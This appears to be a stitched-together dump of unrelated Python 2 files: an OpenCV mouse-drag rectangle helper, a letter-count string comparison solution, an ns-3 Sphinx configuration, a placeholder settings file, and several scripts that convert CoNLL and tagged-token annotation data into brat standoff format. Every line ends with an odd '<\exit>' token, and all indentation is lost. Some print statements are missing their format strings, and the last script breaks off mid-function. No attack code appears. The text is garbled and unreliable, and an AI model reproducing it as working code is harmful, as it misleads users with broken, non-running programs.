if flags & cv2.EVENT_FLAG_LBUTTON:<\exit>
xo, yo = self.drag_start<\exit>
x0, y0 = np.minimum([xo, yo], [x, y])<\exit>
x1, y1 = np.maximum([xo, yo], [x, y])<\exit>
self.drag_rect = None<\exit>
if x1-x0 > 0 and y1-y0 > 0:<\exit>
self.drag_rect = (x0, y0, x1, y1)<\exit>
else:<\exit>
rect = self.drag_rect<\exit>
self.drag_start = None<\exit>
self.drag_rect = None<\exit>
if rect:<\exit>
self.callback(rect)<\exit>
def draw(self, vis):<\exit>
if not self.drag_rect:<\exit>
return False<\exit>
x0, y0, x1, y1 = self.drag_rect<\exit>
cv2.rectangle(vis, (x0, y0), (x1, y1), (0, 255, 0), 2)<\exit>
return True<\exit>
@property<\exit>
def dragging(self):<\exit>
return self.drag_rect is not None<\exit>
def grouper(n, iterable, fillvalue=None):<\exit>
args = [iter(iterable)] * n<\exit>
return it.izip_longest(fillvalue=fillvalue, *args)<\exit>
def mosaic(w, imgs):<\exit>
imgs = iter(imgs)<\exit>
img0 = imgs.next()<\exit>
pad = np.zeros_like(img0)<\exit>
imgs = it.chain([img0], imgs)<\exit>
rows = grouper(w, imgs, pad)<\exit>
return np.vstack(map(np.hstack, rows))<\exit>
def getsize(img):<\exit>
h, w = img.shape[:2]<\exit>
return w, h<\exit>
def mdot(*args):<\exit>
return reduce(np.dot, args)<\exit>
def draw_keypoints(vis, keypoints, color = (0, 255, 255)):<\exit>
for kp in keypoints:<\exit>
x, y = kp.pt<\exit>
cv2.circle(vis, (int(x), int(y)), 2, color)<\exit>
class Solution:<\exit>
def compareStrings(self, A, B):<\exit>
cnt = [0 for _ in xrange(26)]<\exit>
for c in A:<\exit>
cnt[ord(c)-ord('A')] += 1<\exit>
for c in B:<\exit>
cnt[ord(c)-ord('A')] -= 1<\exit>
if cnt[ord(c)-ord('A')]<0:<\exit>
return False<\exit>
return True<\exit>
if __name__=="__main__":<\exit>
assert Solution().compareStrings("A", "")==True<\exit>
def wrap_ord(a):<\exit>
if isinstance(a, str):<\exit>
return ord(a)<\exit>
elif isinstance(a, int):<\exit>
return a<\exit>
import sys, os<\exit>
extensions = ['sphinx.ext.pngmath']<\exit>
templates_path = ['_templates']<\exit>
source_suffix = '.rst'<\exit>
master_doc = 'index'<\exit>
project = u'ns-3'<\exit>
copyright = u'2008-11, ns-3 project'<\exit>
version = 'ns-3.13'<\exit>
release = 'ns-3.13'<\exit>
today = 'December 23, 2011'<\exit>
exclude_patterns = []<\exit>
pygments_style = 'sphinx'<\exit>
html_theme = 'default'<\exit>
html_static_path = ['_static']<\exit>
htmlhelp_basename = 'ns-3doc'<\exit>
latex_documents = [<\exit>
('index', 'ns-3-tutorial.tex', u'ns-3 Tutorial',<\exit>
u'ns-3 project', 'manual'),<\exit>
]<\exit>
man_pages = [<\exit>
('index', 'ns-3-tutorial', u'ns-3 Tutorial',<\exit>
[u'ns-3 project'], 1)<\exit>
]<\exit>
ADMIN_CONTACT_EMAIL = CHANGE_ME<\exit>
BASE_DIR = CHANGE_ME<\exit>
DATA_DIR = CHANGE_ME<\exit>
WORK_DIR = CHANGE_ME<\exit>
USER_PASSWORD = {<\exit>
}<\exit>
MAX_SEARCH_RESULT_NUMBER = 1000<\exit>
DEBUG = False<\exit>
TUTORIALS = False<\exit>
LL_DEBUG, LL_INFO, LL_WARNING, LL_ERROR, LL_CRITICAL = range(5)<\exit>
LOG_LEVEL = LL_WARNING<\exit>
try:<\exit>
assert DATA_DIR != BACKUP_DIR, 'DATA_DIR cannot equal BACKUP_DIR'<\exit>
except NameError:<\exit>
pass<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
import codecs<\exit>
INPUT_ENCODING = "ASCII"<\exit>
OUTPUT_ENCODING = "UTF-8"<\exit>
output_directory = None<\exit>
def unescape_PTB(s):<\exit>
return s.replace("-LRB-", "(").replace("-RRB-", ")").replace("-LSB-", "[").replace("-RSB-", "]").replace("-LCB-", "{").replace("-RCB-", "}").replace('``', '"'). replace("''", '"').replace('\\/', '/')<\exit>
def quote(s):<\exit>
return s in ('"', )<\exit>
def space(t1, t2, quote_count = None):<\exit>
if re.match(r'^[\($]$', t1):<\exit>
return False<\exit>
if re.match(r'^[.,;%\)\?\!]$', t2):<\exit>
return False<\exit>
if quote(t1) and quote_count is not None and quote_count % 2 == 1:<\exit>
return False<\exit>
if quote(t2) and quote_count is not None and quote_count % 2 == 1:<\exit>
return False<\exit>
return True<\exit>
def tagstr(start, end, ttype, idnum, text):<\exit>
assert '\n' not in text, "ERROR: newline in entity '%s'" % (text)<\exit>
assert text == text.strip(), "ERROR: tagged span contains extra whitespace: '%s'" % (text)<\exit>
return "T%d\t%s %d %d\t%s" % (idnum, ttype, start, end, text)<\exit>
def output(infn, docnum, sentences):<\exit>
global output_directory<\exit>
if output_directory is None:<\exit>
txtout = sys.stdout<\exit>
soout = sys.stdout<\exit>
else:<\exit>
outfn = os.path.join(output_directory, os.path.basename(infn)+'-doc-'+str(docnum))<\exit>
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)<\exit>
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)<\exit>
offset, idnum = 0, 1<\exit>
doctext = ""<\exit>
for si, sentence in enumerate(sentences):<\exit>
prev_token = None<\exit>
prev_tag = "O"<\exit>
curr_start, curr_type = None, None<\exit>
quote_count = 0<\exit>
for token, ttag, ttype in sentence:<\exit>
if curr_type is not None and (ttag != "I" or ttype != curr_type):<\exit>
print >> soout, tagstr(curr_start, offset, curr_type, idnum, doctext[curr_start:offset])<\exit>
idnum += 1<\exit>
curr_start, curr_type = None, None<\exit>
if prev_token is not None and space(prev_token, token, quote_count):<\exit>
doctext = doctext + ' '<\exit>
offset += 1<\exit>
if curr_type is None and ttag != "O":<\exit>
curr_start, curr_type = offset, ttype<\exit>
doctext = doctext + token<\exit>
offset += len(token)<\exit>
if quote(token):<\exit>
quote_count += 1<\exit>
prev_token = token<\exit>
prev_tag = ttag<\exit>
if curr_type is not None:<\exit>
print >> soout, tagstr(curr_start, offset, curr_type, idnum, doctext[curr_start:offset])<\exit>
idnum += 1<\exit>
if si+1 != len(sentences):<\exit>
doctext = doctext + '\n'<\exit>
offset += 1<\exit>
print >> txtout, doctext<\exit>
def process(fn):<\exit>
docnum = 1<\exit>
sentences = []<\exit>
with codecs.open(fn, encoding=INPUT_ENCODING) as f:<\exit>
current = []<\exit>
lines = f.readlines()<\exit>
for ln, l in enumerate(lines):<\exit>
l = l.strip()<\exit>
if re.match(r'^\s*$', l):<\exit>
if len(current) > 0:<\exit>
sentences.append(current)<\exit>
current = []<\exit>
if len(sentences) >= 10:<\exit>
output(fn, docnum, sentences)<\exit>
sentences = []<\exit>
docnum += 1<\exit>
continue<\exit>
m = re.match(r'^(\S+)\s(\S+)$', l)<\exit>
if not m:<\exit>
m = re.match(r'^(\S+)\s\S+\s(\S+)$', l)<\exit>
assert m, "Error parsing line %d: %s" % (ln+1, l)<\exit>
token, tag = m.groups()<\exit>
m = re.match(r'^([BIO])((?:-[A-Za-z_]+)?)$', tag)<\exit>
assert m, "ERROR: failed to parse tag '%s' in %s" % (tag, fn)<\exit>
ttag, ttype = m.groups()<\exit>
if len(ttype) > 0 and ttype[0] == "-":<\exit>
ttype = ttype[1:]<\exit>
token = unescape_PTB(token)<\exit>
current.append((token, ttag, ttype))<\exit>
if len(current) > 0:<\exit>
sentences.append(current)<\exit>
if len(sentences) > 0:<\exit>
output(fn, docnum, sentences)<\exit>
def main(argv):<\exit>
global output_directory<\exit>
output_directory = None<\exit>
filenames = argv[1:]<\exit>
if len(argv) > 2 and argv[1] == "-o":<\exit>
output_directory = argv[2]<\exit>
print >> sys.stderr, "Writing output to %s" % output_directory<\exit>
filenames = argv[3:]<\exit>
fail_count = 0<\exit>
for fn in filenames:<\exit>
try:<\exit>
process(fn)<\exit>
except Exception, e:<\exit>
print >> sys.stderr, "Error processing %s: %s" % (fn, e)<\exit>
fail_count += 1<\exit>
if fail_count > 0:<\exit>
print >> sys.stderr,  % (fail_count, len(filenames))<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
import codecs<\exit>
INPUT_ENCODING = "Latin-1"<\exit>
OUTPUT_ENCODING = "UTF-8"<\exit>
output_directory = None<\exit>
def quote(s):<\exit>
return s in ('"', )<\exit>
def space(t1, t2, quote_count = None):<\exit>
if re.match(r'^[\(]$', t1):<\exit>
return False<\exit>
if re.match(r'^[.,\)\?\!]$', t2):<\exit>
return False<\exit>
if quote(t1) and quote_count is not None and quote_count % 2 == 1:<\exit>
return False<\exit>
if quote(t2) and quote_count is not None and quote_count % 2 == 1:<\exit>
return False<\exit>
return True<\exit>
def tagstr(start, end, ttype, idnum, text):<\exit>
assert '\n' not in text, "ERROR: newline in entity '%s'" % (text)<\exit>
assert text == text.strip(), "ERROR: tagged span contains extra whitespace: '%s'" % (text)<\exit>
return "T%d\t%s %d %d\t%s" % (idnum, ttype, start, end, text)<\exit>
def output(infn, docnum, sentences):<\exit>
global output_directory<\exit>
if output_directory is None:<\exit>
txtout = sys.stdout<\exit>
soout = sys.stdout<\exit>
else:<\exit>
outfn = os.path.join(output_directory, os.path.basename(infn)+'-doc-'+str(docnum))<\exit>
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)<\exit>
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)<\exit>
offset, idnum = 0, 1<\exit>
doctext = ""<\exit>
for si, sentence in enumerate(sentences):<\exit>
prev_token = None<\exit>
prev_tag = "O"<\exit>
curr_start, curr_type = None, None<\exit>
quote_count = 0<\exit>
for token, ttag, ttype in sentence:<\exit>
if curr_type is not None and (ttag != "I" or ttype != curr_type):<\exit>
print >> soout, tagstr(curr_start, offset, curr_type, idnum, doctext[curr_start:offset])<\exit>
idnum += 1<\exit>
curr_start, curr_type = None, None<\exit>
if prev_token is not None and space(prev_token, token, quote_count):<\exit>
doctext = doctext + ' '<\exit>
offset += 1<\exit>
if curr_type is None and ttag != "O":<\exit>
curr_start, curr_type = offset, ttype<\exit>
doctext = doctext + token<\exit>
offset += len(token)<\exit>
if quote(token):<\exit>
quote_count += 1<\exit>
prev_token = token<\exit>
prev_tag = ttag<\exit>
if curr_type is not None:<\exit>
print >> soout, tagstr(curr_start, offset, curr_type, idnum, doctext[curr_start:offset])<\exit>
idnum += 1<\exit>
if si+1 != len(sentences):<\exit>
doctext = doctext + '\n'<\exit>
offset += 1<\exit>
print >> txtout, doctext<\exit>
def process(fn):<\exit>
docnum = 1<\exit>
sentences = []<\exit>
with codecs.open(fn, encoding=INPUT_ENCODING) as f:<\exit>
current = []<\exit>
lines = f.readlines()<\exit>
for ln, l in enumerate(lines):<\exit>
l = l.strip()<\exit>
if re.match(r'^\s*$', l):<\exit>
if len(current) > 0:<\exit>
sentences.append(current)<\exit>
current = []<\exit>
continue<\exit>
elif (re.match(r'^===*\s+O\s*$', l) or<\exit>
re.match(r'^-DOCSTART-', l)):<\exit>
if len(sentences) > 0:<\exit>
output(fn, docnum, sentences)<\exit>
sentences = []<\exit>
docnum += 1<\exit>
continue<\exit>
if (ln + 2 < len(lines) and<\exit>
re.match(r'^\s*$', lines[ln+1]) and<\exit>
re.match(r'^-+\s+O\s*$', lines[ln+2])):<\exit>
if len(sentences) > 0:<\exit>
output(fn, docnum, sentences)<\exit>
sentences = []<\exit>
docnum += 1<\exit>
m = re.match(r'^(\S+)\s(\S+)$', l)<\exit>
if not m:<\exit>
m = re.match(r'^(\S+)\s\S+\s(\S+)$', l)<\exit>
assert m, "Error parsing line %d: %s" % (ln+1, l)<\exit>
token, tag = m.groups()<\exit>
m = re.match(r'^([BIO])((?:-[A-Za-z_]+)?)$', tag)<\exit>
assert m, "ERROR: failed to parse tag '%s' in %s" % (tag, fn)<\exit>
ttag, ttype = m.groups()<\exit>
if len(ttype) > 0 and ttype[0] == "-":<\exit>
ttype = ttype[1:]<\exit>
current.append((token, ttag, ttype))<\exit>
if len(current) > 0:<\exit>
sentences.append(current)<\exit>
if len(sentences) > 0:<\exit>
output(fn, docnum, sentences)<\exit>
def main(argv):<\exit>
global output_directory<\exit>
output_directory = None<\exit>
filenames = argv[1:]<\exit>
if len(argv) > 2 and argv[1] == "-o":<\exit>
output_directory = argv[2]<\exit>
print >> sys.stderr, "Writing output to %s" % output_directory<\exit>
filenames = argv[3:]<\exit>
fail_count = 0<\exit>
for fn in filenames:<\exit>
try:<\exit>
process(fn)<\exit>
except Exception, e:<\exit>
print >> sys.stderr, "Error processing %s: %s" % (fn, e)<\exit>
fail_count += 1<\exit>
if fail_count > 0:<\exit>
print >> sys.stderr,  % (fail_count, len(filenames))<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
import codecs<\exit>
MAX_DOC_SENTENCES = 10<\exit>
OUTPUT_ROOT = True<\exit>
ROOT_STR = 'ROOT'<\exit>
ROOT_POS = 'ROOT'<\exit>
ROOT_FEAT = ''<\exit>
INPUT_ENCODING = "UTF-8"<\exit>
OUTPUT_ENCODING = "UTF-8"<\exit>
F_ID, F_FORM, F_LEMMA, F_POS, F_FEAT, F_HEAD, F_DEPREL, F_FILLPRED, F_PRED, F_APRED1 = range(10)<\exit>
output_directory = None<\exit>
charmap = {<\exit>
'<' : '_lt_',<\exit>
'>' : '_gt_',<\exit>
'+' : '_plus_',<\exit>
'?' : '_question_',<\exit>
'&' : '_amp_',<\exit>
':' : '_colon_',<\exit>
'.' : '_period_',<\exit>
'!' : '_exclamation_',<\exit>
}<\exit>
def maptype(s):<\exit>
return "".join([charmap.get(c,c) for c in s])<\exit>
def tokstr(start, end, ttype, idnum, text):<\exit>
assert '\n' not in text, "ERROR: newline in entity '%s'" % (text)<\exit>
assert text == text.strip(), "ERROR: tagged span contains extra whitespace: '%s'" % (text)<\exit>
return "T%d\t%s %d %d\t%s" % (idnum, maptype(ttype), start, end, text)<\exit>
def featstr(lemma, feats, idnum):<\exit>
return "#%d\tData T%d\tLemma: %s, Feats: %s" % (idnum, idnum, lemma, feats)<\exit>
def depstr(depid, headid, rel, idnum):<\exit>
return "R%d\t%s Arg1:T%d Arg2:T%d" % (idnum, maptype(rel), headid, depid)<\exit>
def output(infn, docnum, sentences):<\exit>
global output_directory<\exit>
if output_directory is None:<\exit>
txtout = codecs.getwriter(OUTPUT_ENCODING)(sys.stdout)<\exit>
soout = codecs.getwriter(OUTPUT_ENCODING)(sys.stdout)<\exit>
else:<\exit>
if MAX_DOC_SENTENCES:<\exit>
outfnbase = os.path.basename(infn)+'-doc-'+str(docnum)<\exit>
else:<\exit>
outfnbase = os.path.basename(infn)<\exit>
outfn = os.path.join(output_directory, outfnbase)<\exit>
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)<\exit>
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)<\exit>
offset, idnum, ridnum = 0, 1, 1<\exit>
doctext = ""<\exit>
for si, sentence in enumerate(sentences):<\exit>
tokens, deps = sentence<\exit>
idmap = {}<\exit>
prev_form = None<\exit>
if OUTPUT_ROOT:<\exit>
tokens[0] = (ROOT_STR, ROOT_STR, ROOT_POS, ROOT_FEAT)<\exit>
for id_ in tokens:<\exit>
form, lemma, pos, feat = tokens[id_]<\exit>
if prev_form is not None:<\exit>
doctext = doctext + ' '<\exit>
offset += 1<\exit>
print >> soout, tokstr(offset, offset+len(form), pos, idnum, form)<\exit>
print >> soout, featstr(lemma, feat, idnum)<\exit>
assert id_ not in idmap, "Error in data: dup ID"<\exit>
idmap[id_] = idnum<\exit>
idnum += 1<\exit>
doctext = doctext + form<\exit>
offset += len(form)<\exit>
prev_form = form<\exit>
for head in deps:<\exit>
for dep in deps[head]:<\exit>
for rel in deps[head][dep]:<\exit>
if not OUTPUT_ROOT and head == 0:<\exit>
continue<\exit>
print >> soout, depstr(idmap[dep], idmap[head], rel, ridnum)<\exit>
ridnum += 1<\exit>
if si+1 != len(sentences):<\exit>
doctext = doctext + '\n'<\exit>
offset += 1<\exit>
print >> txtout, doctext<\exit>
def read_sentences(fn):<\exit>
sentences=[[]]<\exit>
with codecs.open(fn, 'rU', INPUT_ENCODING) as f:<\exit>
for line in f:<\exit>
line=line.rstrip()<\exit>
if not line:<\exit>
continue<\exit>
if line and line[0] == "#":<\exit>
continue<\exit>
cols=line.split(u'\t')<\exit>
if cols[0] == u'1' and sentences[-1]:<\exit>
sentences.append([])<\exit>
sentences[-1].append(cols)<\exit>
return sentences<\exit>
def resolve_format(sentences, options):<\exit>
fields = {}<\exit>
fields[F_ID] = 0<\exit>
fields[F_FORM] = 1<\exit>
fields[F_LEMMA] = 2<\exit>
fields[F_POS] = 4<\exit>
fields[F_FEAT] = 6<\exit>
fields[F_HEAD] = 8<\exit>
fields[F_DEPREL] = 10<\exit>
fields[F_FILLPRED] = 12<\exit>
fields[F_PRED] = 13<\exit>
fields[F_APRED1] = 14<\exit>
return fields<\exit>
def mark_dependencies(dependency, head, dependent, deprel):<\exit>
if head not in dependency:<\exit>
dependency[head] = {}<\exit>
if dependent not in dependency[head]:<\exit>
dependency[head][dependent] = []<\exit>
dependency[head][dependent].append(deprel)<\exit>
return dependency<\exit>
def process_sentence(sentence, fieldmap):<\exit>
dependency = {}<\exit>
token = {}<\exit>
for fields in sentence:<\exit>
id_ = int(fields[fieldmap[F_ID]])<\exit>
form = fields[fieldmap[F_FORM]]<\exit>
lemma = fields[fieldmap[F_LEMMA]]<\exit>
pos = fields[fieldmap[F_POS]]<\exit>
feat = fields[fieldmap[F_FEAT]]<\exit>
try:<\exit>
head = int(fields[fieldmap[F_HEAD]])<\exit>
except ValueError:<\exit>
assert fields[fieldmap[F_HEAD]] == 'ROOT', \<\exit>
'error: unexpected head: %s' % fields[fieldmap[F_HEAD]]<\exit>
head = 0<\exit>
deprel = fields[fieldmap[F_DEPREL]]<\exit>
mark_dependencies(dependency, head, id_, deprel)<\exit>
assert id_ not in token<\exit>
token[id_] = (form, lemma, pos, feat)<\exit>
return token, dependency<\exit>
def process(fn, options=None):<\exit>
docnum = 1<\exit>
sentences = read_sentences(fn)<\exit>
fieldmap = resolve_format(sentences, options)<\exit>
processed = []<\exit>
for i, sentence in enumerate(sentences):<\exit>
token, dependency = process_sentence(sentence, fieldmap)<\exit>
processed.append((token, dependency))<\exit>
if MAX_DOC_SENTENCES and len(processed) >= MAX_DOC_SENTENCES:<\exit>
output(fn, docnum, processed)<\exit>
processed = []<\exit>
docnum += 1<\exit>
def main(argv):<\exit>
global output_directory<\exit>
output_directory = None<\exit>
filenames = argv[1:]<\exit>
if len(argv) > 2 and argv[1] == "-o":<\exit>
output_directory = argv[2]<\exit>
print >> sys.stderr, "Writing output to %s" % output_directory<\exit>
filenames = argv[3:]<\exit>
fail_count = 0<\exit>
for fn in filenames:<\exit>
try:<\exit>
process(fn)<\exit>
except Exception, e:<\exit>
m = unicode(e).encode(OUTPUT_ENCODING)<\exit>
raise<\exit>
if fail_count > 0:<\exit>
print >> sys.stderr,  % (fail_count, len(filenames))<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
import codecs<\exit>
try:<\exit>
import psyco<\exit>
psyco.full()<\exit>
except:<\exit>
pass<\exit>
SEQUENCE_ERROR_RECOVER, SEQUENCE_ERROR_DISCARD, SEQUENCE_ERROR_FAIL = range(3)<\exit>
SEQUENCE_ERROR_PROCESSING = SEQUENCE_ERROR_RECOVER<\exit>
out = sys.stdout<\exit>
reference_directory = None<\exit>
output_directory = None<\exit>
def reference_text_filename(fn):<\exit>
fnbase = os.path.basename(fn)<\exit>
reffn = os.path.join(reference_directory, fnbase)<\exit>
if not os.path.exists(reffn):<\exit>
reffn = re.sub(r'(.*)\..*', r'\1.txt', reffn)<\exit>
return reffn<\exit>
def output_filename(fn):<\exit>
if output_directory is None:<\exit>
return None<\exit>
reffn = reference_text_filename(fn)<\exit>
return os.path.join(output_directory, os.path.basename(reffn).replace(".txt",".a1"))<\exit>
def process(fn):<\exit>
global out<\exit>
reffn = reference_text_filename(fn)<\exit>
try:<\exit>
reffile = codecs.open(reffn, "rt", "UTF-8")<\exit>
except:<\exit>
print >> sys.stderr, "ERROR: failed to open reference file %s" % reffn<\exit>
raise<\exit>
reftext = reffile.read()<\exit>
reffile.close()<\exit>
try:<\exit>
tagfile = codecs.open(fn, "rt", "UTF-8")<\exit>
except:<\exit>
print >> sys.stderr, "ERROR: failed to open file %s" % fn<\exit>
raise<\exit>
tagtext = tagfile.read()<\exit>
tagfile.close()<\exit>
if output_directory is not None:<\exit>
outfn = output_filename(fn)<\exit>
out = open(outfn, "wt")<\exit>
taggedTokens = []<\exit>
for ln, l in enumerate(tagtext.split('\n')):<\exit>
if l.strip() == '':<\exit>
continue<\exit>
fields = l.split('\t')<\exit>
assert len(fields) == 7, "Error: expected 7 tab-separated fields on line %d in %s, found %d: %s" % (ln+1, fn, len(fields), l.encode("UTF-8"))<\exit>
start, end, ttext = fields[0:3]<\exit>
tag = fields[6]<\exit>
start, end = int(start), int(end)<\exit>
m = re.match(r'^([BIO])((?:-[A-Za-z_]+)?)$', tag)<\exit>
assert m, "ERROR: failed to parse tag '%s' in %s" % (tag, fn)<\exit>
ttag, ttype = m.groups()<\exit>
if len(ttype) > 0 and ttype[0] == "-":<\exit>
ttype = ttype[1:]<\exit>
assert ((ttype == "" and ttag == "O") or<\exit>
(ttype != "" and ttag in ("B","I"))), "Error: tag format '%s' in %s" % (tag, fn)<\exit>
assert reftext[start:end] == ttext, "ERROR: text mismatch for %s on line %d: reference '%s' tagged '%s': %s" % (fn, ln+1, reftext[start:end].encode("UTF-8"), ttext.encode("UTF-8"), l.encode("UTF-8"))<\exit>
taggedTokens.append((start, end, ttag, ttype))<\exit>
def entityStr(startOff, endOff, eType, idNum, fullText):<\exit>
eText = fullText[startOff:endOff]<\exit>
assert "\n" not in eText, "ERROR: newline in entity in %s: '%s'" % (fn, eText)<\exit>
assert eText == eText.strip(), "ERROR: entity contains extra whitespace in %s: '%s'" % (fn, eText)<\exit>
return "T%d\t%s %d %d\t%s" % (idNum, eType, startOff, endOff, eText)<\exit>
idIdx = 1<\exit>
prevTag, prevEnd = "O", 0<\exit>
currType, currStart = None, None<\exit>
for startoff, endoff, ttag, ttype in taggedTokens:<\exit>
if prevTag != "O" and ttag == "I" and currType != ttype:<\exit>
if SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_RECOVER:<\exit>
ttag = "B"<\exit>
elif SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_DISCARD:<\exit>
ttag = "O"<\exit>
else:<\exit>
assert SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_FAIL<\exit>
pass<\exit>
if prevTag == "O" and ttag == "I":<\exit>
if SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_RECOVER:<\exit>
ttag = "B"<\exit>
elif SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_DISCARD:<\exit>
ttag = "O"<\exit>
else:<\exit>
assert SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_FAIL<\exit>
pass<\exit>
if prevTag != "O" and ttag != "I":<\exit>
assert currType is not None and currStart is not None, "ERROR at %s (%d-%d) in %s" % (reftext[startoff:endoff], startoff, endoff, fn)<\exit>
print >> out, entityStr(currStart, prevEnd, currType, idIdx, reftext).encode("UTF-8")<\exit>
idIdx += 1<\exit>
currType, currStart = None, None<\exit>
elif prevTag != "O":<\exit>
assert ttag == "I", "ERROR in %s" % fn<\exit>
assert currType == ttype, "ERROR: entity of type '%s' continues as type '%s' in %s" % (currType, ttype, fn)<\exit>
if ttag == "B":<\exit>
currType, currStart = ttype, startoff<\exit>
prevTag, prevEnd = ttag, endoff<\exit>
if prevTag != "O":<\exit>
print >> out, entityStr(currStart, prevEnd, currType, idIdx, reftext).encode("UTF-8")<\exit>
if output_directory is not None:<\exit>
out.close()<\exit>
def main(argv):<\exit>
global reference_directory, output_directory<\exit>
if len(argv) < 3 or argv[1] != "-d":<\exit>
print >> sys.stderr, "USAGE:", argv[0], "-d REF-DIR [-o OUT-DIR] (FILES|DIR)"<\exit>
return 1<\exit>
reference_directory = argv[2]<\exit>
output_directory = None<\exit>
filenames = argv[3:]<\exit>
if len(argv) > 4 and argv[3] == "-o":<\exit>
output_directory = argv[4]<\exit>
print >> sys.stderr, "Writing output to %s" % output_directory<\exit>
filenames = argv[5:]<\exit>
input_directory = None<\exit>
if len(filenames) == 1 and os.path.isdir(filenames[0]):<\exit>
input_directory = filenames[0]<\exit>
filenames = [os.path.join(input_directory, fn) for fn in os.listdir(input_directory)]<\exit>
print >> sys.stderr, "Processing %d files in %s ..." % (len(filenames), input_directory)<\exit>
fail_count = 0<\exit>
for fn in filenames:<\exit>
try:<\exit>
process(fn)<\exit>
except Exception, e:<\exit>
print >> sys.stderr, "Error processing %s: %s" % (fn, e)<\exit>
fail_count += 1<\exit>
ofn = output_filename(fn)<\exit>
try:<\exit>
os.remove(ofn)<\exit>
except:<\exit>
pass<\exit>
if fail_count > 0:<\exit>
print >> sys.stderr,  % (fail_count, len(filenames))<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
import codecs<\exit>
MAX_DOC_SENTENCES = 10<\exit>
OUTPUT_ROOT = True<\exit>
ROOT_STR = 'ROOT'<\exit>
INPUT_ENCODING = "UTF-8"<\exit>
OUTPUT_ENCODING = "UTF-8"<\exit>
output_directory = None<\exit>
charmap = {<\exit>
'<' : '_lt_',<\exit>
'>' : '_gt_',<\exit>
'+' : '_plus_',<\exit>
'?' : '_question_',<\exit>
'&' : '_amp_',<\exit>
':' : '_colon_',<\exit>
'.' : '_period_',<\exit>
'!' : '_exclamation_',<\exit>
}<\exit>
def maptype(s):<\exit>
return "".join([charmap.get(c,c) for c in s])<\exit>
def tokstr(start, end, ttype, idnum, text):<\exit>
assert '\n' not in text, "ERROR: newline in entity '%s'" % (text)<\exit>
assert text == text.strip(), "ERROR: tagged span contains extra whitespace: '%s'" % (text)<\exit>
return "T%d\t%s %d %d\t%s" % (idnum, maptype(ttype), start, end, text)<\exit>
def depstr(depid, headid, rel, idnum):<\exit>
return "R%d\t%s Arg1:T%d Arg2:T%d" % (idnum, maptype(rel), headid, depid)<\exit>
def output(infn, docnum, sentences):<\exit>
global output_directory<\exit>
if output_directory is None:<\exit>
txtout = sys.stdout<\exit>
soout = sys.stdout<\exit>
else:<\exit>
if MAX_DOC_SENTENCES:<\exit>
outfnbase = os.path.basename(infn)+'-doc-'+str(docnum)<\exit>
else:<\exit>
outfnbase = os.path.basename(infn)<\exit>
outfn = os.path.join(output_directory, outfnbase)<\exit>
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)<\exit>
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)<\exit>
offset, idnum, ridnum = 0, 1, 1<\exit>
doctext = ""<\exit>
for si, sentence in enumerate(sentences):<\exit>
tokens, deps = sentence<\exit>
idmap = {}<\exit>
prev_form = None<\exit>
if OUTPUT_ROOT:<\exit>
tokens = [('0', ROOT_STR, ROOT_STR)] + tokens<\exit>
for ID, form, POS in tokens:<\exit>
if prev_form is not None:<\exit>
doctext = doctext + ' '<\exit>
offset += 1<\exit>
print >> soout, tokstr(offset, offset+len(form), POS, idnum, form)<\exit>
assert ID not in idmap, "Error in data: dup ID"<\exit>
idmap[ID] = idnum<\exit>
idnum += 1<\exit>
doctext = doctext + form<\exit>
offset += len(form)<\exit>
prev_form = form<\exit>
for dep, head, rel in deps:<\exit>
if not OUTPUT_ROOT and head == '0':<\exit>
continue<\exit>
print >> soout, depstr(idmap[dep], idmap[head], rel, ridnum)<\exit>
ridnum += 1<\exit>
if si+1 != len(sentences):<\exit>
doctext = doctext + '\n'<\exit>
offset += 1<\exit>
print >> txtout, doctext<\exit>
def process(fn):<\exit>
docnum = 1<\exit>
sentences = []<\exit>
with codecs.open(fn, encoding=INPUT_ENCODING) as f:<\exit>
tokens, deps = [], []<\exit>
lines = f.readlines()<\exit>
for ln, l in enumerate(lines):<\exit>
l = l.strip()<\exit>
if len(l) > 0 and l[0] == "#":<\exit>
continue<\exit>
if re.match(r'^\s*$', l):<\exit>
if len(tokens) > 0:<\exit>
sentences.append((tokens, deps))<\exit>
tokens, deps = [], []<\exit>
if MAX_DOC_SENTENCES and len(sentences) >= MAX_DOC_SENTENCES:<\exit>
output(fn, docnum, sentences)<\exit>
sentences = []<\exit>
docnum += 1<\exit>
continue<\exit>
fields = l.split('\t')<\exit>
assert len(fields) == 10, "Format error on line %d in %s: expected 10 fields, got %d: %s" % (ln, fn, len(fields), l)<\exit>
ID, form, POS = fields[0], fields[1], fields[4]<\exit>
head, rel = fields[6], fields[7]<\exit>
tokens.append((ID, form, POS))<\exit>
if head != "_":<\exit>
deps.append((ID, head, rel))<\exit>
if len(tokens) > 0:<\exit>
sentences.append((tokens, deps))<\exit>
if len(sentences) > 0:<\exit>
output(fn, docnum, sentences)<\exit>
def main(argv):<\exit>
global output_directory<\exit>
output_directory = None<\exit>
filenames = argv[1:]<\exit>
if len(argv) > 2 and argv[1] == "-o":<\exit>
output_directory = argv[2]<\exit>
